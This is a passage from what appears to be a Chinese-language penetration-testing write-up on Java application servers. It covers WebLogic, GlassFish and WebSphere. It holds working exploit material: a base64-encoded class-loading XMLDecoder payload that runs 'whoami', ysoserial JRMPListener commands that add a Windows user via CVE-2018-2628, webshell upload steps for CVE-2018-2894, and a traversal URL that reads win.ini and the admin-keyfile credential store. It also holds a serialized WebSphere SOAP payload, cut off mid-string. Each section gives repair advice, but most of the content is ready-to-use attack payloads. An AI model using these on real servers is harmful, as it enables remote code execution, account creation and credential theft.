aAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq\&quot;;&quot;</span><br><span class="line">+ &quot;sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();&quot;</span><br><span class="line">+ &quot;byte[] bt = decoder.decodeBuffer(R);&quot;</span><br><span class="line">+ &quot;org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();&quot;</span><br><span class="line">+ &quot;Class cl = cls.defineClass(\&quot;ResultBaseExec\&quot;,bt);&quot;</span><br><span class="line">+ &quot;java.lang.reflect.Method m = cl.getMethod(\&quot;exec\&quot;,new Class[]&#123;String.class&#125;);&quot;</span><br><span class="line">+ &quot;Object object = m.invoke(cl.newInstance(),new Object[]&#123;ua&#125;);&quot;</span><br><span class="line">+ &quot;weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n&quot;</span><br><span class="line">+ &quot;weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n&quot;</span><br><span class="line">+ &quot;outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n&quot;</span><br><span class="line">+ &quot;outputStream.flush();\n&quot;</span><br><span class="line">+ &quot;response.getWriter().write(\&quot;\&quot;);&quot;</span><br><span class="line">+ &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>转换成XMl格式，参考lufei给出的，稍微改一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;</span><br><span class="line">&lt;void&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;void class=&quot;sun.misc.BASE64Decoder&quot;&gt;</span><br><span class="line">&lt;void method=&quot;decodeBuffer&quot; id=&quot;byte_arr&quot;&gt; &lt;string&gt;yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void class=&quot;org.mozilla.classfile.DefiningClassLoader&quot;&gt;</span><br><span class="line">&lt;void method=&quot;defineClass&quot;&gt;</span><br><span class="line">&lt;string&gt;ResultBaseExec&lt;/string&gt;</span><br><span class="line">&lt;object idref=&quot;byte_arr&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;void method=&quot;newInstance&quot;&gt;</span><br><span class="line">&lt;void method=&quot;exec&quot; id=&quot;result&quot;&gt;</span><br><span class="line">&lt;string&gt;whoami&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.Thread&quot; method=&quot;currentThread&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getCurrentWork&quot; id=&quot;current_work&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getClass&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getDeclaredField&quot;&gt;</span><br><span class="line">&lt;string&gt;connectionHandler&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;setAccessible&quot;&gt;&lt;boolean&gt;true&lt;/boolean&gt;&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;get&quot;&gt;</span><br><span class="line">&lt;object idref=&quot;current_work&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;void method=&quot;getServletRequest&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getResponse&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getServletOutputStream&quot;&gt;</span><br><span class="line">&lt;void method=&quot;writeStream&quot;&gt;</span><br><span class="line">&lt;object class=&quot;weblogic.xml.util.StringInputStream&quot;&gt;&lt;object idref=&quot;result&quot;&gt;&lt;/object&gt;&lt;/object&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;flush&quot;/&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;getWriter&quot;&gt;&lt;void method=&quot;write&quot;&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/class&gt;</span><br></pre></td></tr></table></figure>

<p>执行:</p>
<h3 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（反序列化命令执行漏洞（-CVE-2018-2628-））"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（反序列化命令执行漏洞（-CVE-2018-2628-））" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（反序列化命令执行漏洞（ CVE-2018-2628 ））"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（反序列化命令执行漏洞（ CVE-2018-2628 ））</h3><p>Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意<br>命令。</p>
<p>使用exploit.py脚本进行复现,具体使用方法见脚本。</p>
<p>Kail Attack ：192.168.31.232<br>Win03 victim : 192.168.124.130</p>
<p>Kail 执行<br>1 ）下载ysoserial.jar<br>wget <a href="https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar">https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</a></p>
<p>2 ）使用ysoserial.jar，启动JRMP Server</p>
<p>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]<br>其中，[command]是想执行的命令，而[listen port]是JRMP Server监听的端口。、<br>这里我执<br>行java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ‘net user xiaohao xiaohao &#x2F;add’</p>
<p>3 ）执行exploit.py<br>python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</p>
<p>其中，[victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地（Kail系统上的）ysoserial的路径，[JRMPListener ip]和[JRMPListener<br>port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2<br>这里我执行python2 exploit.py 192.168.124.130 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.232 1099 JRMPClient2</p>
<p>结果如下：</p>
<p>修复建议修复建议</p>
<p>1.过滤t3协议。<br>在域结构中点击 安全-&gt;筛选器<br>连接筛选器填: weblogic.security.net.ConnectionFilterImpl 保存后重启Weblogic.</p>
<p>kail再次攻击，Exp将报错。</p>
<p>连接筛选器规则可参考官方文档</p>
<p>2.安装补丁，但是保不准下一次Weblogic缝缝补补的黑名单又被绕过。</p>
<h3 id="Weblogic-任意文件上传漏洞（任意文件上传漏洞（-CVE-2018-2894-））"><a href="#Weblogic-任意文件上传漏洞（任意文件上传漏洞（-CVE-2018-2894-））" class="headerlink" title="Weblogic 任意文件上传漏洞（任意文件上传漏洞（ CVE-2018-2894 ））"></a>Weblogic 任意文件上传漏洞（任意文件上传漏洞（ CVE-2018-2894 ））</h3><p>Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在”生产模式”下默认不开启，所以该漏洞有一定限制。</p>
<p>影响版本：12.1.3.0, 12.2.1.2, 12.2.1.3</p>
<p>下载Weblogic 12.1.3.0</p>
<p>安装的时候将Weblogic放在Java JDK的bin目录下，防止出现因环境变量带空格导致的错误，安装过程一直点击下一步即可。</p>
<p>以下复现是在Weblogic开发模式下进行的，若需在生产模式下进行复现，则需要 登录后台页面，点击base_domain的配置，在”高级”设置中 开启 “启用 Web<br>服务测试页” 选项，经过我的验证发现开启之后，不仅需要账号密码登陆，即使登陆了也没有这两处上传点。</p>
<p>访问 ws_utc&#x2F;config.do，设置Work Home Dir为ws_utc应用的静态文件css目<br>录C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css，<br>因为访问这个目录是无需权限的，提交后，点击左侧 安全-&gt; 添加，然后上传Webshell。</p>
<p>点击提交并抓包，获取响应数据包中的时间戳。</p>
<p>然后访问 <a href="http://127.0.0.1:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8Cwebshell%EF%BC%9A">http://127.0.0.1:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell：</a></p>
<p>访问 ws_utc&#x2F;begin.do，点击右上角的文件夹，上传Webshell，点击提交，并抓包。</p>
<p>在返回数据包中得到Webshell路径。</p>
<p>然后访问<a href="http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2019-06-07_17-12-18_558/import_file_name_lxhspy.jsp">http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2019-06-07_17-12-18_558/import_file_name_lxhspy.jsp</a></p>
<p>Note:<br>1 ） <strong>ws_utc&#x2F;begin.do</strong> 使用的工作目录是在使用的工作目录是在 <strong>ws_utc&#x2F;config.do</strong> 中设置的中设置的 <strong>Work Home Dir</strong> 。。<br>2 ）利用需要知道部署应用的web目录。<br>3 ）在生产模式下默认不开启，在后台开启之后，需要认证</p>
<p>修复建议修复建议</p>
<p>启动生产模式，<br>编辑domain路径下的setDomainEnv.cmd文件，将set PRODUCTION_MODE&#x3D; 更改为 set PRODUCTION_MODE&#x3D;true<br>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\bin\setDomainEnv.cmd<br>目前(2019&#x2F;06&#x2F;07) 生产模式下 已取消这两处上传文件的地方。</p>
<h3 id="Weblogic-SSRF-漏洞漏洞-（（-CVE-2014-4210-））"><a href="#Weblogic-SSRF-漏洞漏洞-（（-CVE-2014-4210-））" class="headerlink" title="Weblogic SSRF 漏洞漏洞 （（ CVE-2014-4210 ））"></a>Weblogic SSRF 漏洞漏洞 （（ CVE-2014-4210 ））</h3><p>影响版本：10.0.2.0, 10.3.6.0</p>
<p>访问 &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞，填写任意信息，如下</p>
<p>点击Search，并抓包，抓包之后在Burp中右键，选择Change request method, 将POST请求改变成GET。</p>
<p>参数operator为SSRF的可控参数，将其更改为开放的端口，如<a href="http://127.0.0.1:7001/%EF%BC%8C%E5%B0%86%E8%BF%94%E5%9B%9Eerror">http://127.0.0.1:7001/，将返回error</a> code</p>
<p>若开放端口为HTTP协议，则会返回did not have a valid SOAP content-type。</p>
<p>访问不存在的端口，将返回could not connect over HTTP to server</p>
<p>通过 返回数据包 中的错误信息，即可探测内网状态。</p>
<p>修复建议修复建议</p>
<p>删除SearchPublicRegistries.jsp文件或修改SearchPublicRegistries.jsp文件后缀为不解析后缀，如SearchPublicRegistries.jspxxx，后重启Weblogic，再次访<br>问，如下：</p>
<p>SearchPublicRegistries.jsp路径为：<br>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\uddiexplorer\5f6ebw\war</p>
<h3 id="Weblogic-弱口令弱口令-amp-amp-后台后台-getshell"><a href="#Weblogic-弱口令弱口令-amp-amp-后台后台-getshell" class="headerlink" title="Weblogic 弱口令弱口令 &amp;&amp; 后台后台 getshell"></a>Weblogic 弱口令弱口令 &amp;&amp; 后台后台 getshell</h3><p>弱口令参考：<a href="https://cirt.net/passwords?criteria=WebLogic">https://cirt.net/passwords?criteria=WebLogic</a></p>
<p>访问<a href="http://127.0.0.1:7001/console">http://127.0.0.1:7001/console</a></p>
<p>自动重定向到<a href="http://127.0.0.1:7001/console/login/LoginForm.jsp%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0%E3%80%82">http://127.0.0.1:7001/console/login/LoginForm.jsp，使用弱口令登陆后台。</a></p>
<p>点击部署，进一步点击右边的安装。</p>
<p>点击上载文件，</p>
<p>选择war包，点击下一步</p>
<p>上传完成以后选中你上传的文件,点击下一步</p>
<p>选中作为应用程序安装，点击下一步</p>
<p>然后直接点击完成即可</p>
<p>选用我们安装的应用，点击启动即可。</p>
<p>访问：<a href="http://ip:port/[war包名]/[包名内文件名]">http://ip:port/[war包名]/[包名内文件名]</a></p>
<p>修复建议修复建议</p>
<p>避免后台弱口令。</p>
<h2 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h2><p>GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码<br>以及 Oracle 贡献的 TopLink 持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。</p>
<p>默认端口： 8080 （Web应用端口，即网站内容）， 4848 （GlassFish管理中心）</p>
<p>默认返回的指纹信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server: GlassFish Server Open Source Edition 4.1.2</span><br><span class="line">X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition 4.1.2 Java/Oracle Corporation/1.8)</span><br></pre></td></tr></table></figure>

<p>下载4.1.2版本</p>
<p>解压后，进入glassfish&#x2F;bin目录下打开CMD窗口输入asadmin start-domain启动glassfish</p>
<p>asadmin stop-domain 停止glassfish</p>
<h3 id="GlassFish-Directory-Traversal-（（-CVE-2017-1000028-））"><a href="#GlassFish-Directory-Traversal-（（-CVE-2017-1000028-））" class="headerlink" title="GlassFish Directory Traversal （（ CVE-2017-1000028 ））"></a>GlassFish Directory Traversal （（ CVE-2017-1000028 ））</h3><p>java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的&#x2F;（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。</p>
<p>计算机指定了UTF8编码接收二进制并进行转义，当发现字节以 0 开头，表示这是一个标准ASCII字符，直接转义，当发现 110 开头，则取 2 个字节 去掉 110 模<br>板后转义。<br>UTF8编码模板如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字节数字节数 大小范围（十进制）大小范围（十进制） 字节字节 1 字节字节 2 字节字节 3 字节字节 4</span><br><span class="line">1 U + 0000~ U + 007F（0~127） 0xxxxxxx None None None</span><br><span class="line">2 U + 0080~ U + 07FF（128~2047） 110xxxxx 10xxxxxx None None</span><br><span class="line">3 U + 0800~ U + 0FFF（2048~65535） 1110xxxx 10xxxxxx 10xxxxxx None</span><br><span class="line">4 U + 10000 ~ U + 10FFFF(65536~1114111) 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure>

<p>C0AF 转换位二进制为 110 00000 10 101111 ， 110 开头去掉摸板后为00000 101111 转换为 10 进制为 47 ，ASSCI为&#x2F;.</p>
<p>受影响版本：&lt;&#x3D;4.1.2版本</p>
<p>启动GlassFish后 ，访问<br><a href="http://your-ip:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini">http://your-ip:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</a>,<br>发现成功读取win.ini文件。</p>
<p>Note:如果在你的机器上不能成功读取，请自行添加如果在你的机器上不能成功读取，请自行添加 <strong>..%c0%af</strong></p>
<p>读admin-keyfile文件，该文件是储存admin账号密码的文件,爆破。<br>位置在glassfish&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-keyfile</p>
<p>修复建议修复建议</p>
<p>升级GlassFish最新版本。</p>
<h3 id="GlassFish-后台后台-Getshell"><a href="#GlassFish-后台后台-Getshell" class="headerlink" title="GlassFish 后台后台 Getshell"></a>GlassFish 后台后台 Getshell</h3><p>进入后台后 Applications，右边的deploy</p>
<p>选中war包后上传，填写Context Root 这个关系到你访问的url，点击Ok。</p>
<p>访问<a href="http://127.0.0.1:8080/[Context">http://127.0.0.1:8080/[Context</a> Root]&#x2F;[war包内的filename]</p>
<p>Note: 如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。 <strong>Configuration Error Secure Admin must be enabled to access<br>the DAS remotely</strong></p>
<p>修复建议修复建议</p>
<p>1.不开放后台给外网，<br>2.若开放 密码强度需设置 包含 大写字母，小写字母，数字，特殊字符，且长度大于 10 位。</p>
<h2 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h2><p>WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验。从基于开放标准的丰<br>富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。</p>
<p>下载安装7.0 WebSphere</p>
<p>指纹:<br>Server: WebSphere Application Server&#x2F;7.0</p>
<p>登录页面：<br><a href="http://127.0.0.1:9060/ibm/console/logon.jsp">http://127.0.0.1:9060/ibm/console/logon.jsp</a><br><a href="https://127.0.0.1:9043/ibm/console/logon.jsp">https://127.0.0.1:9043/ibm/console/logon.jsp</a></p>
<h3 id="Java-反序列化反序列化-CVE-2015-7450-））"><a href="#Java-反序列化反序列化-CVE-2015-7450-））" class="headerlink" title="Java 反序列化反序列化 (CVE-2015-7450 ））"></a>Java 反序列化反序列化 (CVE-2015-7450 ））</h3><p>访问 8880 端口，出现如下界面，则可能存在Java反序列化漏洞</p>
<p>访问 8880 ，并抓包，然后替换如下Payload进行复现，注意更改下Host.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.31.12:8880</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">SOAPAction: urn:AdminService</span><br><span class="line">Content-Length: 8886</span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Header ns0:JMXConnectorContext=&quot;rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1